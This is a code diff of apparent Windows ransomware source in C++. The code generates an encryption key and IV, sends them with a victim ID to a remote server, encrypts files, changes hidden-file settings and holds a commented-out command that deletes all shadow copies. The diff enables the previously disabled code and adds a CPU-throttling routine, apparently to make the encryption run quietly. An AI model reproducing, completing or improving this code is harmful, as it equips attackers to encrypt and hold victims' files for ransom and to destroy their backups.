@@ -1,8 +1,9 @@
 #include "Encryption.h"
 #include <algorithm>
 #include <stdexcept>
-#ifdef ENC
-#if 0
+#define LIMIT_CPU_FAIL 0
+
+#if 1
 using namespace boost::filesystem;
 using std::string;
 
@@ -21,15 +22,19 @@ void changeHiddenFileState(bool state);
 void destroyVSS();
 
 
+Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
-	PBYTE masterIV, masterKey;
-	Status status = generateKeyAndIV(&masterIV, &masterKey);
+	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
 	string pathToID = get_home() + R"(\SquanchedID.id)";
 	std::ofstream IDFile;
 	PBYTE id = nullptr;
+	HANDLE hCurrentProcess = nullptr;
+	HANDLE hJob = nullptr;
+	/* let's begin*/
+	Status status = generateKeyAndIV(&masterIV, &masterKey);
 	if (!NT_SUCCESS(status))
 	{
 		goto CLEAN;
@@ -45,6 +50,11 @@ int main(int argc, char* argv[]) {
 	}
 	status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	if(!NT_SUCCESS(status))
+	{
+		goto CLEAN;
+	}
+	status = LimitCPU(hCurrentProcess, hJob);
+	if(LIMIT_CPU_FAIL == status)
 	{
 		goto CLEAN;
 	}
@@ -69,9 +79,7 @@ int main(int argc, char* argv[]) {
 
 	changeHiddenFileState(true);
 	
-#ifdef DEBUG
-	
-#else
+#ifndef DEBUG
 	string path = get_home();
 #endif
 
@@ -103,12 +111,10 @@ CLEAN:
 
 
 
-
+/*usefull functions =]] */
 
 Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
 {
-
-
 	DWORD status;
 	string strID;
 	strID.assign((char*)id, ID_LEN);
@@ -133,6 +139,7 @@ void destroyVSS()
 {
 	//ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
 }
+
 void changeHiddenFileState(bool state)
 {
 	SHELLSTATE ss;
@@ -142,6 +149,7 @@ void changeHiddenFileState(bool state)
 	ss.fShowSuperHidden = state;
 	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
 }
+
 DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
 {
 	DWORD status;
@@ -283,13 +291,6 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	//keep in persistant file
 
 
-#ifdef DEBUG
-	// Print key and initialization vector
-	std::cout << "Key:\t\t" << key << std::endl;
-	std::cout << "IV:\t\t" << iv << std::endl;
-	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
-	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
-#endif
 	
 	status = getKeyHandle(key, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
@@ -358,6 +359,49 @@ CLEANUP:
 		HeapFree(GetProcessHeap(), 0, keyIVBuff);
 }
 
+Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
+{
+	Status status;
+	/* following will slow down the whole process*/
+	//TODO encapsulate in function
+	hCurrentProcess = GetCurrentProcess();
+	if (nullptr == hCurrentProcess)
+	{
+		return LIMIT_CPU_FAIL;
+	}
+	hJob = CreateJobObject(NULL, NULL);
+	if (nullptr == hJob)
+	{
+		return LIMIT_CPU_FAIL;
+	}
+	status = AssignProcessToJobObject(hJob, hCurrentProcess);
+	if (0 == status)
+	{
+		return LIMIT_CPU_FAIL;
+	}
+	JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuInfo;
+	status = QueryInformationJobObject(
+		hJob,
+		JobObjectCpuRateControlInformation,
+		&cpuInfo,
+		sizeof(cpuInfo),
+		NULL);
+	if (0 == status) {
+		return LIMIT_CPU_FAIL;
+	}
+	cpuInfo.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP |
+		JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
+		JOB_OBJECT_CPU_RATE_CONTROL_NOTIFY;
+	cpuInfo.CpuRate = (5 * 100);
+	//5 is arbitrary, *100 is a way to normalize value based on documentation
+	status = SetInformationJobObject(
+		hJob,
+		JobObjectCpuRateControlInformation,
+		&cpuInfo,
+		sizeof(cpuInfo)
+	);
+	return status;
+}
 
 //string get_username() {
 //#ifdef _WIN32
@@ -395,5 +439,4 @@ CLEANUP:
 //void send() {
 //
 //}
-#endif
 #endif
